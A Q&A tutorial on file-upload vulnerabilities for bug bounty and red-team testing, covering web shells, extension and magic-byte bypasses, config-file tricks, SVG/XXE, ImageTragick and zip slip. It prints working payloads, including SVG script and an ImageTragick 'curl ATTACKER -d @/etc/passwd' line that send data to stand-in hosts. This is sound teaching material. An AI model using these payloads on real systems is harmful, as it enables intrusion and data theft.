# File Upload Vulnerabilities — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

**Author:** x8bitranjit

> A complete, in-depth study + field reference for file-upload attacks: from "what is it" to RCE chains across every major stack. Q&A format, progressive difficulty. Includes tools, payloads, methodology, real-world references, **and** defense + bypass.
>
> ⚖️ **Authorized use only.** Everything here is for bug bounty (in-scope), sanctioned pentests, CTFs, and learning. Don't test systems you don't have written permission to test.

**Canonical references** (cited throughout — these are real and worth reading in full):
- PortSwigger Web Security Academy — *File upload vulnerabilities*
- OWASP — *Unrestricted File Upload* + *File Upload Cheat Sheet* (WSTG-BUSLOGIC / OTG-BUSLOGIC-009)
- HackTricks — *File Upload* + *Upload payloads/Web shells*
- PayloadsAllTheThings — *Upload Insecure Files*
- CVE-2016-3714 (ImageTragick), Zip Slip (Snyk, 2018), phar:// deserialization (Sam Thomas, BlackHat 2018)

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals** (Q1–Q8)
- **Level 1 — Beginner: unrestricted upload & web shells** (Q9–Q16)
- **Level 2 — Validation bypasses** (Q17–Q32)
- **Level 3 — Per-technology RCE** (Q33–Q45)
- **Level 4 — Content/parser attacks (SVG/XXE/ImageMagick/polyglots)** (Q46–Q56)
- **Level 5 — Archives, race conditions, path traversal, DoS** (Q57–Q64)
- **Level 6 — Cloud, SSRF, WAF/CDN bypass, expert chains** (Q65–Q78)
- **Tooling** (Q79–Q83)
- **Black-box methodology & checklist** (Q84–Q88)
- **Payload cheat sheets** (Q89–Q92)
- **Real-world case patterns & references** (Q93–Q96)
- **Defense — how to do uploads securely** (Q97–Q100)
- **Level 7 — Interview questions (articulate it out loud)** (Q101–Q112)
- **Level 8 — Scenario-based (you're handed a situation)** (Q113–Q120)

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is a file upload vulnerability?

> *Plain version:* the "browse… upload" button looks harmless, but the server has to **do something** with your file — store it, resize it, parse it, serve it back. Each of those steps can be tricked. The whole class boils down to one question: *can I make the server treat my bytes as code (or as a dangerous document) somewhere I can reach?*

It's any flaw in how an application accepts, validates, stores, processes, or serves user-supplied files that lets an attacker do something unintended. The classic worst case is **Remote Code Execution (RCE)** by uploading server-executable code (a "web shell"), but file upload is a *category* — it also leads to XSS, XXE, SSRF, LFI/path traversal, DoS, deserialization, and authorization bypass. The bug is rarely "upload allowed" alone; it's the combination of **what you can upload** × **where it lands** × **how it's served/processed**.

### Q2. Why are uploads so dangerous and so common in bug bounty?
Because almost every app has them (avatars, KYC/ID docs, resumes, attachments, CSV/Excel import, profile banners, support-ticket files, "import from URL"), and developers consistently get validation wrong. A single working web shell upload is usually **Critical (CVSS 9–10)** and pays top-tier bounties. It's also a rich *chaining* surface (upload → SSRF → cloud metadata → full compromise).

### Q3. What does the full upload lifecycle look like (and where are the bugs)?
1. **Client picks file** → client-side checks (JS/`accept=` attribute). *Bug: trivially bypassable.*
2. **HTTP request** (usually `multipart/form-data`) carries filename, Content-Type, bytes. *Bug: all three are attacker-controlled.*
3. **Server validation** — extension, MIME, magic bytes, size, image dimensions. *Bug: blacklists, parser quirks.*
4. **Storage** — path, filename, permissions, inside/outside webroot, local vs S3. *Bug: path traversal, predictable names, execution enabled.*
5. **Processing** — image resize (ImageMagick/GD), antivirus, thumbnailing, parsing (XML/PDF/zip). *Bug: ImageTragick, XXE, zip slip, deserialization.*
6. **Serving** — how the file is later retrieved (URL, Content-Type, Content-Disposition, domain). *Bug: MIME sniffing → stored XSS, execution.*
The attacker maps all six stages; the vuln usually lives at the seam between two of them (e.g., validator and webserver disagree on the extension).

### Q4. What's the difference between unrestricted and restricted upload?
- **Unrestricted**: server accepts any file, any name, into an executable/served location. Straight to web shell.
- **Restricted**: server tries to limit type/extension/content. Your job is to find the *gap* between the developer's mental model and the real parser behavior (extension parsing, MIME trust, magic-byte-only checks, processing pipelines).

### Q5. What is a web shell?

> *Plain version:* a web shell is a tiny program you upload that the server will **run for you** every time you visit its URL — turning "upload a file" into "type commands on the server." For a bounty you don't need a full remote-control panel; a one-liner that prints a unique string proves the server executed your code, which is the whole point.

A small server-side script you upload that, when requested via URL, executes attacker commands on the server. Minimal examples:
- PHP: `<?php system($_GET['c']); ?>` → `GET /uploads/shell.php?c=id`
- JSP: `<% Runtime.getRuntime().exec(request.getParameter("c")); %>`
- ASPX: `<% Response.Write(new System.Diagnostics.Process...) %>`
For bug bounty, a *proof* shell is enough — `<?php echo "RCE-POC-".phpinfo(); ?>` or `<?=md5(31337);?>` (expect `6f3249aa304055d63828af3bfab778f6`; PHP casts the int `31337` to the string `"31337"` before hashing) avoids running real commands while proving execution.

### Q6. RCE vs. "just" stored XSS via upload — which matters?
Both are valid. RCE = Critical. Stored XSS via an uploaded HTML/SVG/file that runs in a victim's session on the app origin = High (account takeover potential). Even a "self-only" file that renders on a sensitive same-origin path can matter. Severity = where the file is served (origin) × who views it × what it can do.

### Q7. What's the minimum you must learn before testing uploads?
HTTP `multipart/form-data` structure, how your target's stack maps extension→handler (Apache mod_mime, IIS handler mappings, Tomcat), the difference between MIME/`Content-Type`, file *extension*, and **magic bytes** (file signature), and how to use an intercepting proxy (Burp/Caido) to edit the raw request.

### Q8. What is the single most important mindset shift for upload bugs?

> *Plain version:* everything the browser does to "check" your file is just a suggestion you can ignore — the real fight is between the server's *validator* (which decides "is this an image?") and the server's *executor/renderer* (which decides "what do I actually do with it?"). You win by making those two disagree.

**The client is irrelevant; the server's parser is everything.** Every restriction you see in the browser is advisory. The win comes from making the *validator* and the *executor/renderer* disagree about what the file is.

---

# LEVEL 1 — BEGINNER: UNRESTRICTED UPLOAD & WEB SHELLS

### Q9. How do I find upload functionality (recon)?
- Crawl & spider (Burp, Katana, gospider). Look for `multipart/form-data` forms and JS `FormData`/`fetch` with files.
- Common endpoints: `/upload`, `/avatar`, `/profile/photo`, `/api/files`, `/attachments`, `/import`, `/documents`, `/kyc`, `/media`, `/cms/upload`, GraphQL `Upload` scalar.
- Hidden/secondary: rich-text editors (CKEditor/TinyMCE image upload), markdown image paste, signature pads, CSV/XLSX import, "import from URL", ticket attachments, S3 presigned-URL flows.
- JS analysis: search bundles for `FormData`, `accept=`, `.upload`, `multipart`, `presign`, `createUpload`.

### Q10. What does a raw multipart upload request look like?
```
POST /upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="cat.jpg"
Content-Type: image/jpeg

<binary image bytes>
------X--
```
The three attacker-controlled knobs: **filename**, **Content-Type**, **body bytes**. Edit them in Burp Repeater.

### Q11. What's the first test against any upload?
Baseline + probe:
1. Upload a legit file (e.g., `cat.png`) → note the **response** and especially the **stored URL / how it's retrieved** (often the response or a later GET returns the path).
2. Try `shell.php` (or stack-appropriate) with simple content. If it stores and you can browse to it and it executes → unrestricted upload → RCE.
3. If blocked, note *what* error you get (extension? MIME? size? content?) — that tells you the validation type to bypass.

### Q12. Why is "where the file lands and how it's served" critical?

> *Plain version:* uploading a `.php` means nothing if it lands on an S3 bucket that only hands it back as a plain download — it never *runs*. The exact same file dropped into a folder the web server executes = instant RCE. So before you craft any payload, find out **where your file goes and what URL serves it back** — that alone decides the ceiling.

You need the file to be **(a) in a location the webserver will execute/serve**, and **(b) reachable via a request**. If uploads go to S3 or a non-executing CDN, a `.php` won't run — but XSS/SVG/content-type bugs may still apply. Always confirm the retrieval URL and the response `Content-Type` of your uploaded file.

### Q13. How do I confirm RCE safely for a report?
Use a benign proof: `<?php echo "PWNED_".(7*7); ?>` → expect `PWNED_49`; or `<?=phpinfo()?>`; or OOB: make the shell hit your collaborator: `<?php file_get_contents("https://YOURID.oast.fun/".gethostname()); ?>`. Avoid running destructive commands; capture request/response + the executed output as PoC. Never pivot beyond scope.

### Q14. The upload works but I can't find the file URL — now what?
- Look at the JSON/redirect response for an `id`, `path`, `url`, `key`.
- Guess patterns: `/uploads/<original-name>`, `/files/<uuid>`, `/u/<md5>`, date-based `/2026/06/`.
- Check other features that *display* the file (profile page, download link) and intercept those.
- If filenames are randomized/hashed, you may need a path-traversal or an info-leak to predict/learn the path — or pivot to a content-based bug (XSS/XXE) that fires on upload/preview.

### Q15. What if the file is renamed to a random name but keeps my extension?
Random name is fine for RCE as long as **you learn the name** (from the response) and the **extension still executes**. The dangerous combo is "random name + attacker extension preserved + executable dir." Randomization mainly defeats *overwrite* and *guessing* attacks, not execution.

### Q16. Beginner gotcha: the file uploads but returns 200 yet nothing executes?
Likely served from a non-exec path / wrong handler / wrong Content-Type / behind a static CDN, or the extension was silently changed. Verify: GET the file, read response `Content-Type` and body — is your code returned **as text** (not executed)? If so it's served as a static asset; pivot to XSS/SVG/polyglot or find an executable path (e.g., LFI to include it, `.htaccess`, traversal into webroot).

---

# LEVEL 2 — VALIDATION BYPASSES (THE CORE SKILL)

### Q17. How do I bypass client-side validation?
It only runs in the browser. Bypass by: intercepting the request in Burp and changing filename/Content-Type after the JS check; disabling JS; or crafting the request directly (curl/Python). The `accept="image/*"` attribute and JS `if(ext!=='png')` are not security.

### Q18. How do I bypass Content-Type / MIME validation?
The server trusts the `Content-Type` header you send. Set it to an allowed value while keeping your real payload:
```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png        <-- lie here

<?php system($_GET['c']); ?>
```
If it also checks the *extension*, combine with an extension bypass (Q19–Q24).

### Q19. How do I attack an extension **blacklist**?
Blacklists are incomplete by nature. Try every executable alias the handler accepts:
- **PHP**: `.php3 .php4 .php5 .php7 .pht .phtml .phar .pgif .inc .phps .php.` and uppercase `.pHp`, `.PHP`. (Apache+mod_php often runs several.)
- **ASP/ASP.NET**: `.asp .aspx .ashx .asmx .asax .ascx .cer .asa .soap .config`
- **JSP (Tomcat/Jetty)**: `.jsp .jspx .jspf .jsw .jsv .jtml`
- **ColdFusion**: `.cfm .cfml .cfc .jsp`
- **Perl/CGI**: `.pl .pm .cgi .lib`
- **Python (if CGI)**: `.py`
Plus case variants and trailing tricks (Q21). Wordlists: SecLists `web-extensions.txt`.

### Q20. How do I attack an extension **whitelist** (only .jpg/.png/.pdf allowed)?

> *Plain version:* a denylist ("block `.php`") is a bouncer with a list of banned names — you just use a name they forgot (`.phtml`). A whitelist ("only `.jpg`") is stricter, so instead you exploit the fact that the *validator* and the *web server* read the filename differently — `shell.php.jpg` looks like a jpg to one and runs as PHP on the other.

Whitelists are stronger but breakable via **parser disagreements**:
- **Double extension**: `shell.php.jpg` (if the server checks the *last* ext but the webserver executes on an *earlier* known ext via Apache `mod_mime` multi-extension parsing) or `shell.jpg.php` (if it checks the *first* ext / `strpos` mistakes).
- **Trailing characters** the OS/webserver strip: `shell.php.` `shell.php ` (space), `shell.php%20`, `shell.php%00.jpg` (null byte — legacy PHP/Java), `shell.php;.jpg` (old IIS), `shell.php::$DATA` (NTFS Alternate Data Stream), `shell.php/`, `shell.php....` (Windows trims dots/spaces).
- **Config-file upload** to *redefine* what executes (`.htaccess`, `web.config`, `.user.ini` — Q33–Q35).
- **Content/processing bug** even with a real image extension (SVG/ImageMagick/XXE — Level 4).

### Q21. Explain the classic dangerous extension tricks precisely.
| Trick | Example | Why it works |
|---|---|---|
| Double ext (Apache) | `x.php.jpg` | mod_mime: with `AddHandler php .php`, Apache executes any file whose name *contains* `.php`, regardless of trailing `.jpg`. |
| Reverse double ext | `x.jpg.php` | validator does `startswith`/`split('.')[1]` and sees `jpg`, but real ext is `.php`. |
| Null byte | `x.php%00.jpg` | C-string truncation at `\0` in old PHP(<5.3.4)/Java → stored as `x.php`. |
| Trailing dot/space | `x.php.` / `x.php ` | Windows strips → `x.php`. |
| NTFS ADS | `x.php::$DATA` | IIS/Windows writes `x.php`, stream ignored. |
| Semicolon (old IIS) | `x.asp;.jpg` | IIS6 executes up to `;`. |
| Case | `x.pHp` | case-insensitive handler, case-sensitive blacklist. |
| Uncommon exec ext | `x.phtml`, `x.phar` | handler maps it; blacklist forgot it. |

### Q22. What about **magic-byte / file-signature** validation?

> *Plain version:* some servers don't trust the name or the header — they peek at the *first few bytes* to check it "really" starts like an image. You beat that by gluing a real image header onto the front of your payload (`GIF89a` + your PHP). The sniffer sees "yep, a GIF"; the PHP engine still finds and runs the `<?php` further down.

Some servers read the first bytes to confirm it's a "real" image. Spoof the signature by **prepending the magic header** to your payload:
- GIF: `GIF89a` then `<?php ... ?>` → `GIF89a<?php system($_GET['c']);?>`
- PNG: `\x89PNG\r\n\x1a\n...`, JPEG: `\xFF\xD8\xFF\xE0`, PDF: `%PDF-1.5`
The file passes the "is it an image?" sniff but still contains executable code. Pair with an extension that executes (e.g., `.php` if allowed, or `.htaccess` to run `.gif` as PHP). Use `exiftool` to embed payloads in real images' metadata (Q23).

### Q23. How do I hide a payload inside a *real, valid* image?
- **EXIF/metadata injection**: `exiftool -Comment='<?php system($_GET["c"]); ?>' cat.jpg` — file stays a valid renderable JPEG but contains PHP in the comment. Executes if the image is ever `include()`d or served by a PHP-handling extension.
- **Polyglots** (Q50): a file that is simultaneously a valid JPEG/GIF/PDF **and** valid PHP/HTML/JS.
- **Trailing append**: image bytes + payload after EOF marker (works because parsers stop at EOF but PHP scans whole file for `<?php`).

### Q24. The server re-encodes/resizes images (GD/ImageMagick). Does metadata injection survive?
Usually **no** — re-encoding strips metadata and rebuilds pixels, killing appended/EXIF payloads. This is a strong defense. Counter-moves: (a) attack the *processor itself* (ImageTragick / GhostScript — Q48), (b) embed payload in pixel data that survives a *specific* transform (advanced/CTF-ish), or (c) pivot to a format that isn't re-encoded (PDF, SVG, DOCX, ZIP).

### Q25. What is filename-based injection (beyond execution)?
The filename is attacker data that often gets reflected, stored, logged, or used in shell/SQL/template contexts:
- **Stored XSS**: `"><img src=x onerror=alert(document.domain)>.png` reflected in a file list.
- **SQLi**: `cat',(select ...)).png` if filename hits an unparameterized query.
- **Command injection**: `; id ;.jpg` or `$(id).jpg` if filename is passed to a shell (e.g., `convert <name>`).
- **Path traversal**: `../../../var/www/html/shell.php` (Q60).
- **SSTI/log poisoning**: filename rendered in a template or written to logs you can later include.

### Q26. How do I bypass when only the extension at the **end** is checked but I need execution?
Use config-driven execution (`.htaccess`/`.user.ini`/`web.config`) so a *whitelisted* extension (.jpg) is executed as code; or rely on webserver multi-extension parsing (`x.php.jpg` on misconfigured Apache); or LFI to `include()` your image-disguised payload.

### Q27. Multipart parser tricks — how do servers disagree?
The frontend WAF/proxy and the backend framework may parse `multipart/form-data` differently. Tricks:
- **Multiple `filename=`**: send two `filename` params; WAF reads one, app reads the other.
- **Quoted/encoded filename**: `filename="x.jpg"; filename="x.php"`, `filename*=UTF-8''x.php`, newlines/`%0a` in the filename, `filename="x.p\nhp"`.
- **Content-Type casing / duplicates**: `Content-Type: IMAGE/png`, two `Content-Type` headers.
- **Boundary tricks**: unusual/duplicated boundaries, missing CRLF, `Content-Type: multipart/form-data` without boundary then supply your own. (See Burp **HTTP Request Smuggler** / **Upload Scanner**.)

### Q28. What about size / dimension validation?
Min/max size and image-dimension checks are anti-DoS, not anti-RCE, but they can block your payload (too big) or fail-open. Pixel-flood / decompression-bomb images can DoS the resizer (Q63). A 1×1 GIF with appended PHP often passes dimension checks.

### Q29. How do I bypass "the app appends its own extension"?
If the server forces `.jpg` onto your name, you need either (a) a content/processing bug (SVG/XXE/ImageMagick) since execution is off the table, or (b) a null-byte/traversal to control the final name, or (c) a config-file upload that makes `.jpg` executable.

### Q30. Double-extension on **nginx/PHP-FPM** — any special case?
Yes: the historic nginx + PHP-FPM `cgi.fix_pathinfo=1` issue let `/uploads/cat.jpg/x.php` (or `cat.jpg%00.php`) execute the JPG as PHP because FPM split PATH_INFO. Also `.user.ini` in the upload dir (Q35) is a clean FPM RCE primitive.

### Q31. What is the `.phps`/`.inc`/`source` pitfall?
Some handlers map `.phps` to a *source viewer* (not execution) — useful to read code, not run it. `.inc`/`.module`/`.tpl` may or may not execute depending on config. Always test what the handler actually does (does it run, render, or show source?).

### Q32. How do I systematically brute the bypass space?
Use Burp Intruder / `fuxploider` / `upload_bypass` with a matrix of {extension list} × {Content-Type list} × {magic-byte prefix on/off} × {filename trailing tricks}, and a **success oracle** (does GET of the stored file execute/return code?). Automate detection of "file stored + reachable + executed."

---

# LEVEL 3 — PER-TECHNOLOGY RCE

### Q33. `.htaccess` upload — the Apache RCE primitive. How?

> *Plain version:* if the server only lets you upload "images," don't fight it — **change the rules of the room**. `.htaccess` is Apache's per-folder settings file; upload one that says "run `.jpg` files as PHP," then upload your PHP-as-a-jpg. You didn't smuggle an executable extension past the filter; you redefined what the allowed extension *means*.

If you can upload a file named `.htaccess` into a directory Apache serves with `AllowOverride`, you redefine handlers so a benign extension runs as PHP:
```apache
AddType application/x-httpd-php .jpg
# or, more robust:
<FilesMatch "\.(jpg|gif|png)$">
  SetHandler application/x-httpd-php
</FilesMatch>
# or, run a .gif as php via php_value (older):
AddHandler php-script .gif
```
Then upload `shell.gif` (with `<?php ...?>`) → request it → PHP executes. Works only if the app lets you write `.htaccess` and Apache reads it (AllowOverride FileInfo). Classic, still found in the wild.

### Q34. `web.config` upload — the IIS / ASP.NET equivalent?
Uploading `web.config` to an IIS app dir can enable execution or even run inline script:
```xml
<?xml version="1.0"?>
<configuration><system.webServer>
 <handlers><add name="x" path="*.config" verb="*" type="System.Web.UI.PageHandlerFactory" /></handlers>
</system.webServer>
<!-- some setups allow classic ASP inline: -->
</configuration>
<%@ Language="JScript"%><% Response.Write("RCE-"+(7*7)); %>
```
Behavior varies by IIS version/config; `web.config` can also be abused for stored config injection, URL rewrite SSRF, and disabling auth in that dir.

### Q35. `.user.ini` — the PHP-FPM RCE primitive?
On PHP-FPM, a per-directory `.user.ini` is read for `INI_PERDIR` settings. Upload:
```
auto_prepend_file=shell.gif
```
plus `shell.gif` containing `<?php ...?>`. Now **every** PHP file in that dir auto-includes your shell. If the upload dir has any `.php` (or you can reach one), you get execution. Subtle and often missed by defenders.

### Q36. JSP / Java — how to get RCE?
- Upload a `.jsp`/`.jspx` web shell into a served dir of a Java app (Tomcat/Jetty) → request it → `Runtime.exec`.
- **WAR deploy**: if Tomcat **Manager** (`/manager/html` or `/manager/text`) is exposed with weak creds, upload a malicious `.war` → instant RCE (this is a top finding; pair with default `tomcat:tomcat`).
- Spring file upload + path traversal to drop a `.jsp` under the webapp.
- Deserialization if the upload feeds a Java object stream (Q72).

### Q37. ASP.NET specifics beyond `.aspx`?
`.aspx .ashx .asmx .asax .ascx .cshtml` can execute; `web.config` (Q34); **ViewState** deserialization if MAC is off/known key (ysoserial.net); `.config`/`.cer` tricks on old IIS; `.svc` (WCF). Also "upload then LFI/`@Html.Partial`" includes.

### Q38. Node.js — uploads rarely give direct RCE. What's the play?
Node doesn't execute uploaded `.js` by URL (no per-file handler), so think differently:
- **Path traversal on write** to overwrite app files (`server.js`, `package.json`, a required module, `.env`, or a static `index.html`) → code change → RCE/defacement.
- **Prototype pollution / config files**: upload a JSON/YAML config the app `require()`s.
- **EJS/Pug/Handlebars template upload** that the app renders → SSTI → RCE.
- **Dependency confusion via uploaded `package.json`** in CI/import flows.
- **Serving uploaded HTML/SVG** on the app origin → stored XSS.
- **Multer misconfig**: original filename used in path → traversal.

### Q39. Python (Flask/Django) — RCE routes?
- Upload `.py` only matters if something imports/executes it (rare) — instead target **pickle/deserialization** (`pickle.load` on uploaded data = instant RCE), **YAML `yaml.load`** (unsafe), **template upload** rendered by Jinja2 → SSTI, **path traversal** to overwrite `.py`/`settings.py`/templates, or **tarfile/zipfile extraction** → zip slip (Q57).
- `werkzeug` debug console if exposed.

### Q40. Ruby / Rails?
- **Marshal/`Marshal.load`** or YAML deserialization on uploaded data.
- ERB template upload → SSTI.
- `send_file`/path traversal to read/overwrite.
- Image processing via ImageMagick (`mini_magick`/`carrierwave`) → ImageTragick (Q48).

### Q41. ColdFusion?
`.cfm`/`.cfc` upload = direct RCE (`<cfexecute>`); CF has a long history of unauth file-upload RCE (e.g., FCKeditor/CKFinder, CVE-2009-2265, and newer admin uploads). Always test `.cfm`.

### Q42. What if it's a static host / no server-side language?
No RCE via execution, but: stored **XSS** (HTML/SVG/JS served on a sensitive origin), **content-type sniffing** attacks, **open redirect via uploaded files**, **cache poisoning**, and **cloud** misconfig (S3 object overwrite, public ACL — Q65). Severity depends on origin and what scripts can reach.

### Q43. How does **LFI + upload** combine into RCE?

> *Plain version:* two "meh" bugs become one Critical. The upload only accepts images? Fine — upload an image with PHP hidden inside (passes every image check). Separately, an LFI bug lets you tell the app "include this file." Point it at your image → PHP runs. Neither bug is RCE alone; together they are.

If the app has Local File Inclusion (`include($_GET['page'])`), upload an *image* containing `<?php ?>` (passes image checks), then `?page=/uploads/cat.jpg` → PHP executes the embedded code. Upload doesn't need to allow `.php` at all. Also `phar://` (Q51) and PHP wrappers turn many "file read" bugs into RCE.

### Q44. CKEditor/TinyMCE/CMS upload bugs — why so common?
Bundled file managers (CKFinder, KCFinder, elFinder, Responsive FileManager) frequently ship with weak/auth-less upload and directory listing. Fingerprint the editor, check its known CVEs and default upload endpoints (`/ckfinder/`, `/kcfinder/upload.php`, `/filemanager/`).

### Q45. WordPress / plugins?
A huge share of real-world upload RCE is WP plugin arbitrary-file-upload CVEs (`wp-content/uploads/...`). Methodology: identify plugins (wpscan), check exploit-db/CVE for "arbitrary file upload", many are unauth. Also `media` + `.htaccess` is blocked by default but plugin endpoints often aren't.

---

# LEVEL 4 — CONTENT / PARSER ATTACKS (image, XML, polyglots)

### Q46. SVG uploads — why are they dangerous?

> *Plain version:* an SVG isn't a picture like a JPEG — it's an XML **document that can carry `<script>`**. If the app shows your SVG inline on its own domain, that script runs in a victim's session = stored XSS. And because it's XML, the same file can also trigger XXE (file read / SSRF) when the server parses it. One upload, two whole bug classes.

SVG is **XML + scriptable**. If served inline on the app origin (Content-Type `image/svg+xml`, not `attachment`), it executes:
- **Stored XSS**:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><script>fetch('/api/me').then(r=>r.text()).then(t=>navigator.sendBeacon('//ATT/',t))</script></svg>
```
- **XXE / SSRF / LFI** (SVG is XML, parsers may resolve entities — Q47):
```xml
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<svg><text>&x;</text></svg>
```
- **SSRF via `<image href="http://169.254.169.254/...">`** when the server rasterizes the SVG (rsvg/ImageMagick).
Defense bypass: many filters block `.svg` but allow it via `image/svg+xml` content-type, or via `.svgz` (gzip), or rendered inside PDFs.

### Q47. XXE via uploaded office/XML files — how?
DOCX/XLSX/PPTX/ODT are ZIP-of-XML; SVG, RSS, SAML, `.xml`, `.plist` are XML. If the server parses them with a vulnerable XML parser (external entities enabled):
```xml
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://ATT/x.dtd"> %p;]>
```
→ file read (`file:///etc/passwd`), SSRF (`http://169.254.169.254/...`), OOB exfiltration (blind XXE with parameter entities + external DTD). DOCX XXE: unzip, edit `[Content_Types].xml`/`document.xml` to add a DOCTYPE, re-zip, upload to a "resume/contract parser." Classic high-impact bug bounty find.

### Q48. ImageMagick / ImageTragick (CVE-2016-3714) — still relevant?
Yes — many apps resize/convert uploads with ImageMagick. Malicious image formats (MVG/MSL/SVG) abused delegate commands:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|curl ATTACKER -d @/etc/passwd)'
pop graphic-context
```
Upload as `.mvg`/`.svg`/disguised → on processing, RCE/SSRF/file-read. Related: GhostScript delegate RCE (`-dSAFER` bypasses), `MSL`/`ephemeral:`/`label:` coders, video via `ffmpeg` HLS/AVI SSRF & file read (`/etc/passwd` exfil). Probe: upload a known-benign trigger that pings your collaborator.

### Q49. PDF / GhostScript / EXIF — what bugs?
- **PDF**: JavaScript in PDF (limited), SSRF via `/URI`/external resources when server renders/thumbnails, GhostScript RCE on conversion.
- **EXIF**: XSS payloads in metadata reflected when the app prints EXIF; also EXIF used to smuggle PHP (Q23).
- **PDF generators** (wkhtmltopdf, headless Chrome "HTML→PDF") that take user HTML → **SSRF/LFI** via `<iframe src=file://>`, `<img src=http://169.254.169.254>` (huge bug-bounty class).

### Q50. What is a polyglot file and when do I need one?
A file valid as **two types at once** so it passes a "real image" check yet executes/renders as code. Examples:
- **GIF/PHP**: `GIF89a;<?php system($_GET['c']);?>` named `.php` → valid GIF header + runs as PHP.
- **JPEG/PHP**: PHP appended after JPEG EOF; needs PHP execution context.
- **PDF/HTML/JS polyglots** for content-type confusion / XSS where the browser sniffs HTML.
- **PHAR/JPEG** for phar deserialization (Q51).
Use polyglots when validation checks magic bytes/renders a thumbnail but the serving/inclusion context still executes.

### Q51. Explain phar:// deserialization (PHP).
PHP `phar://` archives carry serialized metadata that is **unserialized when any file op touches the phar path** (`file_exists`, `fopen`, `getimagesize`, `is_dir`…). If you can (a) upload a crafted PHAR (often disguised as JPEG: `phar-jpeg` polyglot) and (b) make the app perform a filesystem operation on `phar:///path/to/upload`, you trigger object injection → RCE via a POP gadget chain. Landmark research: Sam Thomas, "It's a PHP unserialization vulnerability Jim" (BlackHat USA 2018). Look for `getimagesize($_GET['file'])`-style sinks.

### Q52. Content-Type confusion / MIME sniffing — how does it cause XSS?
If the server stores your file and serves it with a wrong/missing `Content-Type` (or `X-Content-Type-Options` absent), browsers may **sniff** an HTML/JS payload and execute it. Upload `poc.png` whose bytes are `<html><script>alert(document.domain)</script>` (or a real-PNG-then-HTML polyglot). If served on the **app origin**, that's stored XSS. Mitigated by `X-Content-Type-Options: nosniff` + `Content-Disposition: attachment` + a separate sandbox domain.

### Q53. How do I weaponize uploaded HTML?
Upload `.html`/`.xhtml`/`.shtml`/`.svg` that's served inline on the app's origin → full stored XSS (cookie theft, CSRF token exfil, account takeover). Even when `.html` is blocked, `.svg`, `.xml`, `.xht`, or content-type confusion often work. If served from a sandbox domain (e.g., `usercontent.example.net`), impact drops to that origin.

### Q54. EXIF/SVG XSS that fires on a *preview/admin* page — why valuable?
Many uploads are reviewed by staff/admins (KYC docs, support attachments). A stored XSS in an SVG/image that triggers in the **admin panel** = privileged account takeover / internal access — often higher impact than self-XSS. Always ask "who else renders this file, on what origin?"

### Q55. JSON/CSV/Excel "formula injection" (CSV injection)?
If the app exports user-supplied data to CSV/XLSX that's opened in Excel/Sheets, a cell starting with `= + - @` can execute (`=cmd|'/c calc'!A1`, `=HYPERLINK(...)` for exfil). Relevant when *your uploaded data* is later exported. Severity varies (client-side, requires victim to open + ignore warnings) but valid on many programs.

### Q56. What's a "magic-byte + extension + content-type all checked" target — can it still fall?
Yes — pivot from *execution* to *processing*: a perfectly valid `.jpg` (right magic bytes, right MIME, right ext) can still trigger ImageTragick, pixel-bomb DoS, SSRF via embedded URLs on rasterization, or XXE if it's actually an SVG mislabeled. The strongest defenders also **re-encode** — then you attack the encoder or change format.

---

# LEVEL 5 — ARCHIVES, RACE CONDITIONS, TRAVERSAL, DoS

### Q57. What is Zip Slip?

> *Plain version:* when the server unzips your archive, it trusts the *names inside*. Name a file `../../../../var/www/html/shell.php` and a naive extractor happily writes it **outside** the intended folder — straight into the web root. So "upload a zip we'll extract" (themes, plugins, backup-restore) quietly becomes "write a file anywhere on the server."

A path-traversal in archive extraction: a zip/tar entry named `../../../../var/www/html/shell.php` writes **outside** the intended dir on extract, overwriting arbitrary files → RCE/defacement/persistence. Affects many libs/languages (Snyk disclosure, 2018). Test any "upload a zip/import archive/restore backup/theme/plugin" feature. Build the evil zip with a crafted entry name (zip libs that don't sanitize), e.g. Python:
```python
import zipfile
z=zipfile.ZipFile('evil.zip','w'); z.writestr('../../../../var/www/html/x.php','<?php system($_GET["c"]);?>'); z.close()
```

### Q58. Symlink attacks in archives?
A tar/zip containing a **symlink** entry (e.g., `link -> /etc/passwd`) followed by a normal file that writes *through* the link can read/overwrite host files on extraction (if the extractor follows symlinks). Used to read secrets or escalate in CI/build/import pipelines.

### Q59. Zip bomb / decompression DoS?
A tiny archive that expands to terabytes (`42.zip`, nested zips) exhausts disk/RAM/CPU on extraction → DoS. Lower severity but valid where the server auto-extracts. Image equivalent: **pixel flood** / decompression-bomb PNG (huge dimensions, tiny file) crashing the resizer.

### Q60. Path traversal in the **filename/path** field?
If the upload path is built from user input without sanitization: `filename=../../../../var/www/html/shell.php` writes into the webroot → RCE; or overwrite `.htaccess`, `index.php`, `authorized_keys`, app config. Also test path params separate from the file part (`path`, `dir`, `folder`, `key` for S3). Encode variants: `..%2f`, `..%5c` (Windows), `....//`, `%2e%2e/`, overlong UTF-8.

### Q61. Race condition (TOCTOU) on upload?
Pattern: server saves the file, *then* validates/AV-scans/renames/deletes it. Between save and delete there's a window where the file is **executable and reachable**. Attack: upload the shell and *simultaneously* hammer GET requests to it (Burp Turbo Intruder / parallel curl) to hit it before deletion. Also applies to "upload → moved to quarantine" and "upload → processed → removed."

### Q62. Race with random filenames?
If the filename is randomized you may not know the URL in time — but sometimes the *response* returns the temp path, or the file sits at a predictable temp location (`/tmp/phpXXXXXX`, framework temp dirs) briefly. Combine with LFI to include the temp upload (the classic PHP `LFI + phpinfo()` temp-file race to leak the random temp name).

### Q63. How can uploads cause DoS beyond bombs?
Unbounded size (fill disk), many concurrent uploads, expensive processing (ImageMagick on huge dimensions, ffmpeg on crafted media), and storage cost amplification (cloud). Usually lower bounty but report if it impacts availability/cost.

### Q64. What about overwriting other users' files?
If filenames/paths are predictable or user-controlled and not namespaced per-user, you may **overwrite another user's avatar/document** (integrity), or read others' files (IDOR on the retrieval endpoint — `GET /files/1234`). Always test the *download/retrieval* side for IDOR too; upload bugs and IDOR frequently chain.

---

# LEVEL 6 — CLOUD, SSRF, WAF/CDN BYPASS, EXPERT CHAINS

